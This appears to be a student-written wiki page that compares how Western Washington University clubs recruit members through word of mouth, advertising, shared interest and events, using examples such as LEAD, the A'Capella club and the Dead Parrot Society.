In the A'Capella Club members spread the word of this club through the main use of verbal communication. Many of the club's audience consist of friends, and the passing crowd. However, because their club revolves around the use of auditory methods it can be heard from all around. So for example over the next school year, the A'Capella Club will be losing two members after graduation. In consequence they are now searching for two new members to audition for next years group. Using the word of mouth and communicating through their network of close friends and colleagues they are forming a tryout list that will consist of a typical song that the group will sing and a piece that the person auditioning could &quot;show off&quot; with. So in this case the methods of verbal recruiting is very effective due to the fact that they people informed are already interested and involved with the A'Capella club. Therefore, giving that passion that is associated with an effective and strong club.

Word of mouth has quite another meaning for spreading information about the A'capella Club. Since the group has quite a few performing members, it's very easy to go out on any given night and see the talent that the club has produced. By making themselves visible within the community they also give curious people a chance to talk to club members about what they like and (in rare cases) don't like about being in the A'capella Club.  By making information easily available the information permeates every level of the school and that allows even the people that don’t attend the events to be aware of the club’s activities.   This is remarkably similar to clubs like the Dead Parrot Society. They are both clubs full of performers who are out sharing their art with people and when they share their art they also leave people with an opinion of the club and its members.  When people are constantly learning about student run organizations such as these it becomes easier for organizations to gather members even with members of the club graduating every year

(A)Unique skills give the club an extra boost in the word of mouth way. The A'capella group has members that compose their own music they provide a unique quality to their group. When people learn through word of mouth that original pieces are being performed this adds to the buzz about the group. When a club provides this kind of unique originality it gives them added popularity. As the Dead Parrots have the publicity of improvisation and the A'capella group have their original composition, each group finding their staple adds to how well they are known by word of mouth.

While some groups experience low attendance perpetuated by word-of-mouth reliance, as noted by Kendall Ring's analysis of Women in the Woods, the Campus Christian Fellowship's experience has been quite different.  Despite the significant attendance clubs like CCF enjoy, word-of-mouth has one substantial failing as a recruiting tool.  Garnering only members of similar inclination, the word-of-mouth technique has resulted in a homogenized community.  Organizational unity is certainly a positive result, but the best interest of all clubs is served in diverse membership; humanity learns best not from harmonious solidarity, rather through clashes of thought.  To this end, it is preferable for clubs to actively campaign themselves.  Only by such means can disinclined individuals be introduced to club ideologies, potentially giving rise to altered evaluations.

Just as CCF, KSA (Korean Student Association) also recruits its members through word of mouth. However, unlike CCF, KSA could not have done information fair at the beginning of the quarter because KSA is a new club that is just created last winter quarter. In the interest of sharing Korean culture with other people at Western, KSA members introduce their club meeting to their friends and classmates. They also go and participate in other club meetings and other school events and tell people about the KSA. They are all very welcome for new members and let people to enjoy the time together. Furthermore, they have a Facebook group which is to make convenient for their members to communicate. That way, newcomers can make oneself more familiar with other club members.

The Dead Parrot society has a few problems, one of them being spreading the word around to be able to get new people interested in their organization. Even though they try to spread the word around through all the shows and they also try to tell people about it as much as they can to get people excited its still not enough and there's really not a lot of people that join. Its really hard to get people to join such a small group because there's really not a big fan base and there's not a lot of people that can spread the word around as there would be if there were more people to do it.

LEAD is a very well run organization/AS club. They are both effective at recruiting volunteers and members, as well as, getting funds to support the organization. LEAD is able to get many volunteers due to their collaboration with environmental studies/sciences classes here on campus. By partnering with and thus offering extra credit to volunteers, LEAD is able to get a very large pool of able-bodied volunteers. This is especially true for classes such as Environmental Science 101 that has upward of 500 students, with at least 200 of them a quarter vying for spots in work parties. Also helping them get volunteers is the fact that they are also partnered with the Bellingham school district and general word of mouth. Since they have become a respected and generally well-regarded student run organization, people from the community also volunteer. This is unlike other AS clubs, in that most are advertised from word-of-mouth only and don’t usually involve collaboration with Western Washington University classes. This, however, has proved to be a double-edged sword, as the ease at which they get volunteers has since reached the point of where it hurts LEAD more than it helps. This is because of the fairly low number of work parties. With so many people constantly trying to volunteer coupled with their limited members leads to a bottle necking of volunteers. This year for instance, has gotten to the point of where they couldn't even accept people for their wait lists. A way to solve this budget constraint would be to use word of mouth to make more clubs similar to LEAD. If they were to do this they could recruit more people because the budget would get split. When making more groups they can keep in mind that they can make the environment better, because not everybody is the best at everything. The other group could specialize in half the activities and LEAD could take the other half of the responsibilities. When they are specializing on the activities that they've chose, both groups will get farther in what they want to and they could actually double the process that they would be doing the following year. To get the word out to the interested young adults they could just announce it at the next meeting. They would saying &quot;we will be splitting up (for example) in to LEAD A and LEAD B and each one will have different requirements,&quot; or something along those lines. Splitting this club would also mean, more people would be participating and less people will be on the waiting list, might even make Western Washington University have a better reputation.

Word of mouth combined with interest is a common theme for many AS club recruitment tactics such as the Western Men Against Violence group and the Homeless Outreach group. They utilize low key and non-aggressive recruitment tactics while still being active members of campus life/activities. This approach helps create a group that has a relaxed and communal feeling to it. Even though overall numbers are slightly hampered by it, the quality of each individual member seems to compensate for any lack of sheer force/manpower. Also, this style of recruitment blends extremely well with the theme/goal of the WMAV of non-aggression and control. However, this style also requires the current members to feel comfortable speaking with others about their involvement in the club. During interviews with WMAV, it was commented on that even (or perhaps especially) the older members were unwilling to speak to their friends/acquaintances about the club, because they were frustrated with the negative reactions they sometimes received. So, for some clubs the word of mouth style is theoretically a good idea, but in reality is ineffective.

In the Women and the Woods club most of their membership recruitment is through word of mouth.  This technique works well for them.  This works better for them because then it is directed toward people that want to be involved with the types of activities they participate in.  Word of mouth also ensures knowing someone when entering the club.  It can be easier to interact with new people when there is a familiar face next to them.  They also post their activities on Facebook and welcome anyone to join in on the activities without being a member.  This gives people a chance to see how well they enjoy the activities that happen within that club.  This is a very inviting group that will take anyone who wants learn more about outdoor activities.  Even though it says 'Women' in the Woods it is welcome to men as well.  When talking with one of the leaders she mentioned that their boyfriends often come to their activities.  With that advertising is not extravagant with the Women in the Woods but it is filled with members that   
want to be there and enjoy the same type of things.

With over 16,000 students circulating around Western Washington University's campus every day, word of mouth can serve as more than enough to influence and persuade these students to check out a new club. Because the idea of some clubs are so intriguing, the mere suggestion that one should join a club, or at least check it out, from a friend or acquaintance can act as the necessary push for many students to join the numerous clubs and activities that Western has to offer. People with similar interests tend to come together and talk about those interests. Word of mouth comes in handy with this process, because if you are interested in weight lifting, croquet, photography, art, literature, film, politics, recreational activities, or even Harry Potter: there is a club for that! Word of mouth comes in many different forms, including from friends, acquaintances, teachers, Facebook, fliers, or even people walking by you in Red Square. So keep your ears open and you will undoubtedly hear about a club that might interest you and make your experience at Western that much better.

The Tango Clubs only recruitment is through word of mouth. This technique works well for them because they aren't looking to spend a whole bunch of time making fliers or trying to recruit. This is partly in order for the group leaders to maintain a close contact with its members. Word of mouth is often much more convincing way of recruitment because it is more personal and often done by friends of members. The Tango Club also uses their Facebook page as a way to spread their news and club updates to current members and potential members. Other clubs such as the Women and the Woods club uses the same techniques as the Tango Club to recruit members through word of mouth.

With Making Western diverse being brand new to the Associated Students line up for clubs, in the beginning the word of mouth method was all that the few members of MWD had to use.  Then as the club started to progress on to being more official, the use of social networks like Face Book took over as the main ways of getting the club noticed by the student body here at Western.  Unlike the A’Capella club who used their main way of publicizing their club with the word of mouth, MWD uses the word of mouth as a secondary tool. With the social networking tool of Face Book and Myspace, reaching out to many different people at the same time is much easier than totally using the tool of word of mouth. With the use of this Face Book, the club can efficiently connect with more diversified crowd, instead of the word of mouth strategy whereas the people who are spread the word are usually spread the word to their friends only. The only spreading the word to their friend, allow room for the people in the club to be in the same social mind set.

The Sailing Club also uses word of mouth methods, for successful promotion. Many students take sailing classes or other classes at Lakewood, where the Sailing Club mainly participates. So the club gets a lot of exposure through students talking about sailing classes. Many newer members on the team weren’t recruited by elder members, but instead approached the Sailing Club on their own. Often these students have taken one of the sailing courses offered through the school and find that they like the class and would like to sail more. The Sailing Team is easy to contact and promote the sailing club as there is nearly always a member of the club at Lakewood where outdoor and water sport enthusiastic students are likely to visit.

Word of mouth methods are effective in getting people involved with the different groups around campus. This method requires people to actively seek others who might be interested in a group, and this is where many groups, such as the Tango Club, have benefited from social networking tools such as Facebook. The Dead Parrots Society is another example of a club that uses Facebook to gain followers. When using Facebook to promote it is a good idea to insert video demonstrating what the group does or to place links that will provide more information about the group.

===Advertisement ===
Advertisement is a great way for the student clubs to catch the eyes of potential new members. Being in the college community a major form of advertisement is done on Facebook. With current members in the groups on Facebook they are able to send out invites to friends who they think would like to join the club. On Facebook the members can post information about the clubs and answer any questions. Although Facebook is an effective form of advertisement there are other ways such as putting up posters around campus and word of mouth. 

While direct advertisement is a very effective means of recruitment, displaying effective club activities and exciting events is also very effective. Students will naturally be more interested in a club if said club displays active and interesting events. 

A. Swing Kids struggles with advertisement. In my interview with Calieen, her main concern for Swing Kids was the promotion the club is doing in order to gain more members. Many people want to go to Swing Kids, but they don't have any advertisement promoting where and when the even takes place. CCF does a fantastic job at advertising their group through core leaders in all of the dorms, wear shirts that make people want to ask questions, and having different events or classes that people can take throughout the week. Word of mouth then feeds off of effective advertisement. 
Some keys to a successful club such as the Slum Doctors Program are to host events with the help of effective advertising. Advertising which is highly effective in raising awareness and fostering growth and support of the club. Events which if effectively advertised around campus could potentially raise a great deal of awareness. Posters in highly viewed areas, information tables at key junctures around campus, and the like. Raising awareness about the Program will in tern raise awareness about AIDS and Gender Equality. When more people are aware of the cause and the Slum Doctors Program there will be an increase in donations which is so important to all those stricken by AIDS in Africa. Finding people who are generous enough to donate to the club is also something that is keystone to an effective club.
Advertisement is a core factor in the success of a club or organization. It can make or break a club or organization and is often a weakness within clubs and organizations. Most clubs or organizations struggle with finding the best way to reach out to the student body to ensure that everyone has heard about them. For that reason, many are always making efforts to discover and use the most effective form of advertisement. 

Because advertisement is key to keeping the club alive with not only membership, but participation in events, it is important that clubs familiarize themselves with the best advertising strategies. Here on the Western campus there are many different ways to advertise a club and it's events. While advertising at the information fair is always a great way to get both freshman and other students to see what your club is all about, the blackboard blog is also a very convenient and easy way to let other students in on clubs. Everyone has a student account and most everyone has the blog portion on their page when they enter their blackboard. Even though it is on a small portion of the screen bold titles are always something that catch students attention. Online is a great way to reach multiple people on the Western campus and both the Student Homeless Outreach Team, as well as the Men Against Violence use this effective method to get people to know about their clubs. Internet is a thing of the future and it is important that all clubs jump on board when trying to advertise their club both for new membership and for events!

A great place for a club like Students for Slum doctor Program to advertise their club would be around the Fairhaven branch of Westerns campus, in south campus. There seems to be a good amount of knowledge in the students and faculty there regarding social issues, so recruitment for the club Students for Slum Doctors, or any other Social club could be very effective around Fairhaven. I have seem many clubs working outside red square for recruitment and fundraising activities, including the men against violence club, but many people are too busy when on campus to stop and look into clubs that interest them. I feel like getting deeper into the schools themselves, like Fairhaven or the anthropology department (especially for social issues clubs), would be a better place to advertise clubs and activities. Another good way to advertise events may be to ask a teacher in one of these classes to let you give a brief introduction to ones club and goals at the beginning or end of a class period, and possibly teachers could give extra credit to those people who choose to help/join. In all, It seems that recruitment must find its way deeper into the classroom in order to become more effective.

The Cycling Club and Swing Dance Club have a efficient way in advertising students to join the club. For instance, the Cycling club set up a tent in the fall to meet up with students face to face to promote bikers that were interested along with placing index cards on bikes that were locked up on bike racks, where the Swing Dance club posted flyers that targeted dancers that didn't have to have any experience as well as informing students there were many people willing to help making people feel more comfortable to join the club.

The WWU Bodybuilding Club has a natural talent for attracting new members. Being located in the Wade King Rec. Center, the club has instant advertisement. Potential members become interested in the club because the current members exude passion when it comes to bodybuilding. They are always working out at the Rec. Center and are excited to motivate people to get in shape. This organization of a central location is a great way for clubs to advertise! This confidence in ability to attract new members isn't shared by all campus organizations. The photography club, for example, has a hard time recruiting students because students believe that in order to join the club that they have to be a skilled photographer which is not the case. With the bodybuilding club, you don't have to be the heavy weight champion of the world to join. The main goal of this club is to assist people in living a healthy lifestyle, so anyone is welcome to become a member. 

Because recruitment is such an important issue for the Rugby Club, its members put a lot of effort into advertising.  One very effective strategy is how the Rugby Club never fails to put a table out whenever an information fair is put on at Western.  Most information fairs take place in the fall at the beginning of the year, when people are most open to new activities. The Rugby Club doesn't just limit recruitment to the beginning of the year. Members are always welcome regardless of the time of year.  Rugby Club members are also very enthusiastic in their recruitment methods on a person-to-person basis.  Members are encouraged to promote the club whenever they can, such as by talking about it with friends.  Once, team members carried around rugby balls all day in an effort to bring attention to the sport.  Another successful method of advertising that the Dead Parrots Society mostly uses is the traditional poster/ad strategy for its shows.  This is almost solely what the Dead Parrots Society relies on to get people to come to its shows, which is what it relies on to raise money for the club (thus proving its functionality).  Combining these two effective strategies (person-to-person and posters) might provide an even more successful method for advertising a club of any kind.

Though putting a table out may certainly be an effective advertising strategy, the Jewish Chabad seems much better at advertising their existence.  The methods that the Jewish Chabad already uses to recruit members already works wonderfully. The Jewish Chabad club uses word of mouth, Facebook, posters, tabling at vendors row and at red square, and emails. First, the vice president of Hillel Jewish Student Club, Rachel Rasmus, said that the club “recruits” members through tabling at events and through Facebook. Though Rachel was consistent with my asset theme of how they let people know about the club, she did contradict the information I was given by Rani in the same sentence. Rachel used the word “recruit” when discussing how people got to know about the club. However, she contradicted Rani’s information by saying this. Rani was adamantly against using this term saying there is no recruitment whatsoever. Second, Emily Olsen who is doing her project on the Scottish country dance club did not say who she interviewed. However, she remarked that recruiting usually just happens through word of mouth from friend to friend. Third, Rani discussed that every one is welcome to join the club; he went on to say that many times they have people that come simply out of curiosity to see what Jewish event and or holidays are like. This is great for marketing. Last, Rani discussed that they let every Jew know that the club is there to provide every Jew at Western with any needs he might have. Thus, being very welcoming, and using multiple ways of letting everyone know about existence of the club (i.e., Facebook, emails, etc.) are effectual organizational strategies.

The South Asian Student Association at WWU has a lot of potential for advertising. The officers for next year have already started deciding ways to advertise and spread knowledge to Western's campus about this great club. They've recently elected a great public representative who would do her job by bringing in as many people to the meetings as possible. A big factor that is encouraged in the club is that its members bring their friends to the meetings as well. This way, more people know what is going on in the club and that they can join too even if they aren't south Asian in descent. In edition to spreading the word among members to bring their friends to meetings, the club is going to make some posters to put around campus to spread word.

With newer and cooler games coming out this century, recruitment is an essential part to the ongoing existence of the S.M.A.S.H Club that is based around the 90s game SuperSmash Bros. In recent years the SMASH club has been effective in advertising the via word of mouth, hosting events in dorms, and through social networking such as Facebook. These methods have worked fine for the leaders of the club and they seem to have no problem finding new members. In today's society the majority of kids in college have Facebook and check it almost every day, so advertising and recruiting members through Facebook for the club is very effective and it keeps everyone connected. The SMASH club's recruiting methods are similar to that of the Croquet club, which also uses Facebook to recruit and maintain members. The croquet club holds 100 members on Facebook while the SMASH club has around 40-50. People are free to join the club during any time of the year, and there are barely any requirements to joining, which makes recruiting fairly easy for the SMASH club. The club is pretty much open for anyone, regardless if you are good at SMASH or not. As long as you like video games, you'll probably fit in perfectly.

The Planned Parenthood VOX Club uses effective strategies of advertisement where they display information tables in Red Square every week. They realize that the best, most busy day to do this is Friday afternoons, so they have a bright information table from 11AM to around 4PM. It is important that in their advertisement, they appeal to both women and men (many men feeling like Planned Parenthood is just a female's club), so they hand out condoms for men to take also. This form of advertisement is very important for the interest of both genders and will help their overall goal and recruitment. Another great way to advertise is where the club has some connection to other professional associations in the community. For example, the WWU Planned Parenthood club is funded and supported by Mt. Baker's Planned Parenthood downtown Bellingham and this greatly helps with the advertisement for Western's club. The Disability Awareness club also explains, &quot;They have access to many resources... that they can utilize for successful and effective advertisements. This advertisement comes from fliers, handouts, posters, [etc.].&quot; This is a an obvious form of great advertisement, and is in comparison used by The Planned Parenthood VOX Club as well.

The A'capella club has only been around for this year so the effectiveness of their advertising is very minimal. A problem is that they are limited to word of mouth and also through their Facebook page and since budget is also limited, that means they are left to showing what they've got at performances (i.e. underground coffee house or performances signed up for). The idea of entering themselves in cash prize competitions is also in the air to not only spread the word of their uprising but to also help fund the group in sending them to other competitions or just out and about to have a good time. They want to in the future make shirts for the group to wear around campus. This will lead to the creation of signs and posters to put up around campus and also organized advertisement in Red Square. They say they have a lot to do in the advertisement area but next year will be a big improvement.

Another newly founded outreach program is Making Western Diverse Club, which has had to undergo the struggles of beginning an establishment like the A'capella Club. The effectiveness of advertisement is crucial for a club to grow, change, and accomplish goals. Unlike A'capella Club, Making Western Diverse Club understood that word of mouth, Facebook and fliers were not going to make this club prosper to the degree each officer, and member hoped to achieve. They took initiative and got Jamba Juice to come every Tuesday between 12-2pm to sell smoothies with donations towards our club. Shirts are being created and sold, as well as and end of the year fundraiser with fliers are being passed out. Recognizing that advertisement is a huge benefit to, especially to a newly established program by getting word out and creating a foundation for the years to come.

Not all clubs are advertised the same, some have it easier than others. For example, The Submarine club is based out of the engineering building and the Body Building club is based out of the Recreation Center. Anyone is able to join either club, as a freshman you may not ever enter the engineering building, where the submarine club has some advertisements, but everyone has the ability to go to the Rec Center whenever they please. The  Body Building club gets a lot more traffic going through their meeting place, introducing more people to their club. The submarine club does not have this advantage, but what the submarine club does have is the backing of the engineering building. Any person interested in engineering, which are the students in the submarine club, will her about the submarine club. More clubs should get some sort of &quot;sponsorship&quot;. As I have said the Submarine club's &quot;sponsorship&quot; is being able to use the engineering building and it's equipment.

The Photography Club was developed to not only showcase people photos, but to help develop and sharpen skills and fundamentals of photography at all levels. This initially puts off most people, because they feel like they need to be &quot;professional&quot; photographers. This is simple not the case according to the Photography club. They advertise that all levels of photographer are welcome and appreciated, whether you are a professional, or just picked up a camera. This sense of opportunity for beginners to learn, and accomplished photographers to hone their skills is one key aspect that draws people to the club. This is the work of effective advertising by the club, to ensure that people are not put off or intimidated. They also effectively use Facebook and Flickr, to share photos and help to educate and recruit new members, as well as advertise. Without this advertising of the true nature of the club, the club feels that a majority of its members would not have joined in the first place.

As a relatively new club, the Student Coalition for Immigration Rights is facing the issue of advertising.  Thus far they have gotten a lot of help from the club M.E.C.H.A. in growing into their own entity.  From here on out the club needs to start reaching a larger audience base to bring in many more groups.  But S.C.I.R. is not the only club that faces this problem.  In an interview with a member of The Dead Parrots Society it was said that the club utilizes workshops to bring attention to themselves.  The president of S.C.I.R. Maria Corona says that the members of the club are working hard to put on workshops for next year to involve more people.  Ultimately S.C.I.R. will utilize posters and set up a booth on campus to draw people in to attend these workshops.

The slum doctor Program has used advertisement as a great tool in their recruiting efforts. one way they advertise is through their website. fliers have also been a big part of recruitment, the fliers are handed out by current club members at the events they host and other events. they had also set up tables on red square with information and advertisement in order to attract people. another group that has used advertisements through fliers and Facebook is the A.C.C. both these groups have been successful in organizing events and using advertisement effectively.

===Interest ===
In the beginning of the school year, Western Washington University does an excellent job introducing the clubs at the university with the info fair. At the info fair, all the clubs at Western have their own booth where people they can tell potential members about their club. The initial interest of a club is usually made at this fair. Beyond the initial interest, the following clubs show strengths and weakness in how interest is either kept or ways that people lose interest in their club.

Not always does interest have to be catered to by booths or other forums of advertisement. Many times if a student is interested in a particular subject or is from a certain race or creed, that student will want to seek out others who share similarities with them. Word of mouth is also another way that clubs can gain popularity, as popular or fun clubs are more likely to be talked about.

The Dead Parrot Society gains interest by inviting people to watch the shows that they put on. Advertising the upcoming shows is a great attention getter for students interested in improves.  This is a great way to allow people who are interested to see what the final product of their hard work is. After this gains the attention of new possible members, they are very open about inviting everyone to their open meetings every Tuesday to evaluate the talent of the new members. By using their own shows as advertising to students they save the time and effort they would spend by going out and asking people to join. 

One of the Photography Clubs' main goals is to find people who are interested in photography.  A way to observe interest in the community is to find a reliable place to hold meetings.  This would secure members continuing to come to the meetings and share this common interest.  Another way to find interested people is to have more people leading the club.  There can be one president but more officers is needed for the clubs' survival.  More people promoting the club means more interested people are likely to show up.  Unlike the sailing club and the weight lifting club there is no facility for the club members to meet every time.

When students are trying to start a new club or gain new members to their existing club it is very important to think about who would be interested. When you are thinking about starting a new club it is important to make sure that there would be enough people interested in the topic of the club. Furthermore, if a club has too specific of a topic it may be hard to find members. Once the leadership of a club has thought of who might be interested in their club it will be much easier for the club to advertise. This is because they can start advertising in venues where students who may be interested spend their time. It can be very helpful when advertising and starting a club to think about those who would be interested and try to cater to them.

The Sailing club is an organization lucky enough to have a arena for there club meetings as well as a location to sail that is given from nature.  Lakewood is a student run facility where team members practice, hold meetings, store equipment, and run their club.  This is beneficial because Lakewood is open to the public where students can rent sailboats, and in turn enjoy sailing so much that they look to pursue it further by joining the club.  Other clubs such as the weightlifting club are blessed to have facilities (student rec. center) that help in the broadening of group interests to other students on campus.  Western Washington's student clubs can use facilities such as Lakewood to expand their membership base and continue to recruit members for years to come. 

The Hui O' Hawaii cultural organization has found that advertising in off-campus recreational sites are good for membership interest. One function they put on is to teach Hula dancing at the local YMCA. This allows for awareness to be spread across the community and not just within a group of people that share an interest. Advertising off campus can be very helpful by way of recruiting a significantly larger number of participants then could be found on the Western campus alone. This increase in interest would make fund-raising a thoroughly successful operation and would encourage community wide knowledge and acceptance of the club in question.--[[User:Sharpc2|Sharpc2]] ([[User talk:Sharpc2|talk]]) 20:17, 29 May 2009 (UTC) 

The Hui O' Hawaii club has an open-door method when it comes to recruiting new members.  Members are generally recruited by word of mouth from past or current club members but they are not opposed to anyone who shows up with an interest in the club.  This method allows the group members to become very close knit with each other as there are not that many of them and those who are there express a great interest in the Hawaiian culture; a few members still live in Hawaii but are here during the school year and they offer great insight. 

A strategy that has worked quite well for the Harry Potter club is always having open door meetings. Any time during the year, people can walk into Harry Potter club and join at any time. In addition they do not take attendance or require that you be there every time (although they would prefer that you were), allowing a very non-hostile environment. Also, they have the door to their meetings open at all times, so that people passing by might hear that they are having a good time, and will pop in for a few seconds to see what is going on. Their primary active recruiting goes to those whom would be interested in the books, such as having large stuffed animals from the book series, however the club is extremely warm to anyone who enters their doors, which reinforces the idea to return to the club.

The A’capella club recruits members that have a singing ability that adds to the vocal range of the group. The strategy most effective for seeking out these individuals thus far is word of mouth. If someone has the vocal ability and wants to join the club all they need to do then is to set up an audition with the group leader. Since most talented singers are proud of their talent it is easy for them to seek out this club. You have to be exclusively interested in competitively singing with a group to become a member, that’s the bottom line and the basis for this club. The Campus Christian Fellowship (CCF) works in a similar manor by seeking out followers of the Christian faith via word of mouth, and they have upwards of three hundred members. Although singing is a rarer quality than being Christian the interest based recruitment is a functional method based on interest.

For some clubs Interest is the only thing that keeps it alive. Clubs such as Sexploration might harbor a few non-committed members for the free pizza but it is a club that depends on peoples interest in sexual education that keeps it alive. Another example is people will join Frisbee club because they like Frisbee, not because they want to travel and get free food. The Submarine club however is an exception. The group does not depend on any one faucet to be successful. They have a small group of kids that aren't simply just &quot;interested&quot; in submarines. They have a multi-tiered interest in engineering which is the main focus of the club. Problem solving, work groups, budget meetings, and many other structured activities keep the interest of the members without adding extra &quot;bling&quot; such as perks and pizza to draw in unmotivated, part time club goers. This is a more serious club at Western and Their achievement show it.

The most crucial factor in recruiting members for Slum Doctor AS club at Western has been, by far, finding people who already hold some strong interest or passion for their cause of creating awareness and helping promote education in sub-Saharan Africa. Club president Kasey Hostetler discussed with us the modest beginnings of the club, starting with fifty dollars and two committed members with a passion for providing as much aid as possible to those in Africa fighting the AIDS epidemic. She told us that without a solid, passionate foundation and the slow increase of members equally as enthusiastic towards their cause, the club would be nowhere and likely have already died out. A new club, and an extension of the Slum Doctor Program of Bellingham, they have found the most interest in Fairhaven students, many of whom she says are already very passionate and have been excited to partake in their cause. While some groups such as the Rugby club use strategies such as extensive advertising to promote their club, advertising for the Slum Doctor Club has been difficult, with limited funding and not much recognition as such a new club, Kasey said. However, a technique that may be affective for the club in the future, and seems to have been working for the Students against Civilization club is to hold educational events. Many people on Western’s campus seem to be passionate or at least strongly intrigued by the cause Slum Doctor Club has been formed around, and holding events to help promote awareness of their existence while simultaneously educating people about their cause would likely increase membership and interest.

Having truly passionate members is a key component to having a successful organization. When people are interested in something they are more likely to participate, and remain committed to the organization. For example, most of the members of the WWU Body Building Club are very dedicated to body building and it has become a lifestyle for them. These members are the people who are out participating at every event, advertising for the club, and potentially recruiting new members. When there is interest in a particular subject, recruitment will not be a problem. In clubs such as the WWU Body Building Club and also the Cycling Club at Western, word of mouth is the main form of advertisement and recruitment. This strategy is effective because it is an intimate, face-to-face situation that allows a person to really understand the club. Creating interest and having members who are excited and willing to participate is an extremely important asset to any organization.

Such as the WWU Body Building Club and other fitness based clubs are related to the Rugby Club and the interest that students show through the bond with the other teammates as well as showing dedication and commitment to the sport, Rugby. Megan Nakamura said, &quot;The Rugby Club's main asset is the building foundation of the sport&quot;. During the meeting with Connor Nelson, a freshman on the Rugby Club, he mentioned that team members get together whenever they can. He also mentioned that being a part of the Rugby Club, his social life with friends changed as well; he spent majority of his time with the other teammates and this was a similar case for other members. Because of their friendly orientation, it helps them to show others that they are always welcoming new members, which sets a positive outlook on recruiting.

The strategy for the Korean club to recruit members and to have constant members joining is word of mouth. The members spread the word about their club by telling all their friends, and acquaintances. This is a good idea for the club so then they are always trying to bring in more people, and it will keep it a smaller group of people, but there wont be much diversity in the club. The club allows Korean and Non Korean members but only spreading the word about the club by word of mouth is solely bringing in certain group members. A couple times a quarter the Korean club will go out and sell cookies by the VU and place up posters around campus. This is very different to other clubs like (the planned parenthood) plans of recruiting new members once a week in red square. One of the big problems associated with the group and their meetings is since there are not many members in the Korean club it is difficult finding a meeting time for everyone to show up. Other than that the Korean club has shown some growth and will be able to continue to recruit members and share their culture.

&quot;Recruitment for KUGS is relatively easy&quot;, Melissa Derry, Speciality Music Coordinator. They consistently host events such as their &quot;birthday&quot;, celebrated every five years. In my interview with Melissa she talks about how they DJ at events such as their &quot;birthday&quot; and when Jurassic 5 came and performed at WWU. People see what them DJ-ing and see how much fun they are having. From there all it takes is them asking how to get involved, and thus a student and volunteer base is formed fairly simply. Very similar to the way the Dead Parrots Society invites people attend their shows; KUGS promotes their own events. This is easily the least labor-intensive way to recruit new members in any club or organization. By advertising and giving publicity to the amount of 'fun' the organization has, KUGS furthers their fan base and recruitment simultaneously. As suggested by the paragraph regarding Dead Parrots Society, recruiting people in this way is a good way to attain members who already have a strong curiosity or interest in the group.

Among the many students on Western's Washington University, there has been a lack of diversity. This is what brings many students to Making Western Diverse. This club is strictly focused on reaching out to different people from all walks of life to focus on making Western a more comfortable feel. One effective strategy that was used to recruit members was effective planning. The club officers worked really hard on planning events and then bringing their ideas to their club members. This allowed the club members to have a say and also let them know that they were still working towards their goals. Every member of the club was asked to bring someone new to every club meeting. This helped increased members because they were always educated by other members about the club's main purpose. Making Western Diverse also has a Facebook group online that allowed anyone to join. The members were able to invite other Facebook friends to join the group.

With the many clubs offered at Western sometimes it's hard to get word out about a club but the Ritmo Salsa club has come up with an effective way of spreading information. Instead of relying heavily upon posters and flyers the Salsa club took a different approach by showing the Western community what they are actually about. Through out the year the Salsa Club hosts dancing events which gives students an opportunity to see what they actually could be doing and learning, through this display Salsa Club members can spark interest in possible new members. Because many people may never hear about these events more posters may help, for example, the Swing Kids swing dancing club puts fliers in common areas, cafés, and the dining halls making their club information available to anyone who may be interested. Though the Salsa Club does set up a booth during information fairs their club is less visible than the Swing Club.

===Event Recruiting===
Many times student run clubs or organizations need new membership to fill slots absent from graduates and other lost members, this results in a strategy that involves recruiting.  There are many strategies for recruiting members, event recruiting is a method used by different clubs that works in creating a larger membership base.  Whether these events are hosted on or off campus depends on the club and its intentions.
One of the Student Homeless Outreach Team’s (S.H.O.T.) greatest strengths is their recruitment for their quarterly event “Be Our Guest.” Each quarter the club rounds up enough students to donate their meals to feed a hungry person in the community. Each quarter the club has seen an increased number of participants because of word of mouth and new recruiting strategies. This quarter instead of “tabling” in Red Square S.H.O.T. took a new approach and recruited in front of the Viking Commons, eliminating the need for the question, “Do you have a meal plan?” Other important recruiting devices include posters, banners and flyers around the school campus. Other clubs such as The Korean Club, Women in the Woods, and Dead Parrot society that utilize posters and other related recruiting devices find that they increases participation in their on campus events.

LEAD’s effective recruiting methods include offering extra credit for various classes on campus. The club works with the professors of ESTU 202 and ESCI 101 and sends them the sign-in sheets from work parties. Extra credit gives students an incentive to sign up for LEAD activities, and LEAD has an easier time filling up work parties.  LEAD co-directors are responsible for going to these classes and getting the word out about work parties. LEAD also has a website where students can sign up for work parties with the click of a mouse. Students fill out an online form with their name, student number, class (if they want extra credit), and email. The website has the work party schedule for the entire quarter and lists which work parties have spaces available. LEAD uses email to communicate and confirm with volunteers, and sends out reminders and directions via email as well. The Tango Club also uses a website for recruiting new members and advertising events. Tango Club also uses posters and word-of-mouth to spread information on club activities.

This strategy of advertising in classes by word of mouth is effective. Also, the choice to advertise in relative classes such as ESTU 202 and ESCI 101 also help bolster and increase attendance at LEAD's work parties. This strategy has been very effective as the work parties fill up quite quickly and are often difficult to get into after the first couple weeks of a quarter at WWU. The fact that they advertise to relevant classes sets them apart, as their goals have been achieved more than Tango Club's, since the work parties normally fill fast; this may also be because of the incentive, i.e. extra credit in an environmental class the student is currently enrolled in (as long as it is offered for that class).

Unlike the Harry Potter Club, which has a problem with membership, LEAD has developed a very good and stable way to recruit people for their events. They have spoken to and kept ties with professors in environmental studies/sciences classes (ESCI101, ESTU202) and built a system where extra credit is offered if a student participates in a LEAD work party. LEAD comes to the classes and presents how to sign up and what they're about and find themselves overflowing with participants. This is not the only way to participate in LEAD because they also accept drop-in volunteers who are not there for extra credit.

Western's LEAD club speaks to ESCI 101 and ESTU 202 classes shortly after they start to let students know of opportunities where they can both earn extra credit for their class, as well as helping out the community. These &quot;work parties&quot; are first-come, first-serve and can be competitive, since professors encourage participation. I am enrolled in ESTU 202, and a member of LEAD gave us a brief presentation of what the club was about, why their work is important, as well as showed us how to sign up for the weekend work parties. This is done online and students can see which time slots are taken and which are still open. The extra incentive for extra credit appeals to many, so recruiting doesn't seem to be a problem. The only other group I came across that uses online recruitment is the Tango Club. However, they also use posters which I have seen on occasion across campus, but I rarely see posters for LEAD. Spaces need to be available for those enrolled in the ESTU and ESCI classes first, since they have an opportunity for extra credit.

An excellent way to gain new members is to hold a large exciting event that is capable of drawing a crowd.  The idea would be to of course get as many people as possible to hear about your club.  For example the Student Homeless Outreach Team gets noticed by everyone who enters one of the commons when they are advertising for their &quot;be our guest&quot; event.  This is similar to the WWU Body Building club holding the Westerns Strongest Man competition.  The strongman competition was a big event that drew out a big crowd and most definitely increased the popularity of the club.  While at an event with such a big crowd, simply have a sign up sheet on a table somewhere and you will be guaranteed to get new members. This can also be a good idea for other clubs who do not have as much popularity or success recruiting.

